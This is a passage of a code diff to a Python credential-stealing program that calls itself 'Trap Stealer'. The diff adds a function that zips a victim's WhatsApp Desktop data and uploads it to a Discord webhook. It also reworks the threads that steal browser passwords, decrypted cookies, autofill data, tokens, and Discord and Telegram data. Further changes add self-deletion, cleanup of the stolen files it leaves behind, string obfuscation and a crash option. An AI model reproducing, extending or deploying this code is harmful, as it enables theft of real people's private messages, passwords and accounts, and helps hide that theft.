+    return "\n".join(file_list)
+
+def getwhatsapp(base_directory, zip_file_path):
+    try:
+        all_files = []
+
+        for root, dirs, files in os.walk(base_directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                if os.path.isdir(file_path) and not os.listdir(file_path):
+                    continue
+
+                all_files.append(file_path)
+
+        num_files = len(all_files)
+
+        if num_files <= 100:
+            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for file_path in all_files:
+                    zipf.write(file_path, os.path.relpath(file_path, base_directory))
+
+            return list_files_in_directory(base_directory, level=0, max_display=10), zip_file_path
+        else:
+            return "Too many files to display", zip_file_path
+    except:
+        pass
+    
+def uploadwa():
+    try:
+        x, y = getwhatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
+            
+        url = upload_file(y)
+
+
+        data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": "🟢 Whatsapp stealer",
+                        "description": f"📂Here the directory:\n\n```{x}```",
+                        "color": 0xffb6c1,
+                        "fields": [
+                            {"name": f"WhatsApp file", "value": f"      [Click here to download]({url})"},
+                        ],
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
+                    }
+                ]
+        }
+
+        headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    
+    except:
+        pass
+    
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
@@ -1369,6 +1589,7 @@ def ZipThings(path, arg, procc):
     if wall[::-1] in arg or "NationsGlory" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"{browser}"
+        
     elif "Steam" in arg:
         loginusers_file = os.path.join(pathC, "loginusers.vdf")
         if not os.path.isfile(loginusers_file):
@@ -1394,15 +1615,6 @@ def ZipThings(path, arg, procc):
         GamingZip.append([name, lnik])
     else:
         OtherZip.append([name, lnik])
-
-
-from subprocess import Popen, PIPE
-from optparse import OptionParser
-import datetime
-import os
-import requests
-
-
 
 def srcs():
     try:
@@ -1445,21 +1657,33 @@ def paaz():
             filename = "wppassw.txt"
 
             
-        except:pass
+        except:
+            file = "Couldn't get passwords"
+            filename = 'Error.txt'
         try:
             file2 = os.getenv("TEMP") + f"\wpcook.txt"
             filename2 = "wpcook.txt"
 
             
-        except:pass
+        except:
+            file = "Couldn't get cookies"
+            filename = 'Error.txt'
         try:
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             filename3 = "wpautofill.txt"
 
             
-        except:pass
-        with open(file, 'r') as fp:
-            lines = sum(1 for line in fp)
+        except:
+            file = "Couldn't get autofill"
+            filename = 'Error.txt'
+            
+            
+        try:
+            with open(file, 'r') as fp:
+                lines = sum(1 for line in fp)
+        except:
+            lines = 'error'
+            
         def upload_and_assign_variable(file_path, variable):
             try:
                 result = upload_file(file_path)
@@ -1511,11 +1735,26 @@ def paaz():
             ]
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        try:
+            try:
+                os.remove(file)
+            except:
+                pass
+            try:
+                os.remove(file2)
+            except:
+                pass
+            try:
+                os.remove(file3)
+            except:
+                pass
+        except:
+            pass
     except:
         pass
 
 
-def FirefoxCookie():
+def frcook():
     try:
         global Cookies, CookiCount
         firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
@@ -1548,10 +1787,15 @@ def getCook(path, arg):
     try:
         global Cookies, CookiCount
         
-        if not os.path.exists(path): return
+        if not os.path.exists(path): 
+            return
+        
         e = 'seikooC/'
+        
         pathC = path + arg + e[::-1]
-        if os.stat(pathC).st_size == 0: return
+        
+        if os.stat(pathC).st_size == 0: 
+            return
 
         tempfold = (f"{temp}wp"+ ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))+ ".db"
         )
@@ -1567,16 +1811,15 @@ def getCook(path, arg):
 
         pathKey = f"{path}/Local State"
 
-        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
         master_key = CryptUnprotectData(master_key[5:])
   
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
+                Cookies.append(f"{row[0]}     {row[1]}        {decrval(row[2], master_key)}")
                 CookiCount += 1
-        
 
         writeforfile(Cookies, 'cook')
     except:
@@ -1640,7 +1883,13 @@ def GatherZips(paths1, paths2, paths3):
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
+import os
 
+def delete_self(script_path):
+    try:
+        os.remove(script_path)
+    except:
+        pass        
 def GatherAll():
     global PasswCount
     global injection
@@ -1678,13 +1927,16 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
-    a = threading.Thread(target=getinfo)
-    a.start()
-    aa.append(a)
     
-    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
-    eeee.start()
-    aa.append(eeee)
+       
+    getinf = threading.Thread(target=getinfo)
+    getinf.start()
+    aa.append(getinf)
+    
+    if OneTimeSteal == True:
+        ots = threading.Thread(target=antispam)
+        ots.start()
+        aa.append(ots)
 
     if Startup == True:
         sta = threading.Thread(target=startup)
@@ -1692,47 +1944,66 @@ def GatherAll():
         aa.append(sta)
     else:
         pass
-    az = threading.Thread(target=upload_files_to_discord)
-    az.start()
-    aa.append(az)
-    for patt in browserPaths:
-        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
-        tokq.start()
-        aa.append(tokq)
-    for patt in discordPaths:
-        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        di.start()
-        aa.append(di)
+
+        
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
         aa.append(pa)
-    coc = []
+        
     for patt in browserPaths: 
-        a = threading.Thread(target=getCook, args=[patt[0], patt[4]])
-        a.start()
-        coc.append(a)
+        getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
+        getc.start()
+        aa.append(getc)
         
         
     for patt in browserPaths:
-        sta = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
-        sta.start()
-        aa.append(sta)
+        autof = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
+        autof.start()
+        aa.append(autof)
         
+    frfc = threading.Thread(target=frcook)
+    frfc.start()
+    aa.append(frfc)
+        
+    for patt in browserPaths:
+        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
+        tokq.start()
+        aa.append(tokq)
+        
+    gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
+    gatz.start()
+    aa.append(gatz)
+        
+    for patt in discordPaths:
+        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        di.start()
+        aa.append(di)
+    
+    upfd = threading.Thread(target=upload_files_to_discord)
+    upfd.start()
+    aa.append(upfd)
+    
     for thread in aa:
         thread.join()
-        
-    a = threading.Thread(target=FirefoxCookie)
-    a.start()
-    aa.append(a)
     
     hist = threading.Thread(target=histup)
     hist.start()
     aa.append(hist)
+        
+    uploadw = threading.Thread(target=uploadwa)
+    uploadw.start()
+    aa.append(uploadw)
+    
+    paaz_thread = threading.Thread(target=paaz)
+    paaz_thread.start()
+    aa.append(paaz_thread)
+    
     
     scr = threading.Thread(target=srcs)
     scr.start()
     aa.append(scr)
+    
     
     try:
         if antidebugging == True:
@@ -1744,12 +2015,16 @@ def GatherAll():
     except:
         pass
 
+    
     if injection == True:
         try:
             ij = threading.Thread(target=idisc)
             ij.start()
             aa.append(ij)
-        except:pass
+            
+            NoDiscord = False
+        except:
+            pass
     else:pass
     
     try:
@@ -1762,14 +2037,9 @@ def GatherAll():
             pass
     except:
         pass
-    for thread in coc:
+    for thread in aa:
         thread.join()
-        
-    paaz_thread = threading.Thread(target=paaz)
-    paaz_thread.start()
-    aa.append(paaz_thread)
-
-        
+    
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
@@ -1781,7 +2051,23 @@ def GatherAll():
         wb.start()
         aa.append(wb)
     
+    e = []
+    if self_delete == True:
+        ss = threading.Thread(target=self_delete)
+        ss.start()
+        e.append(ss)
+    else:
+        pass
+    for thread in e:
+        thread.join()
     for thread in aa:
         thread.join()
+        
+    if crasher == True:
+        crashs()
+        
+    if melter == True:
+        script_path = os.path.realpath(__file__)
+        delete_self(script_path)
 
-GatherAll() 
+GatherAll()
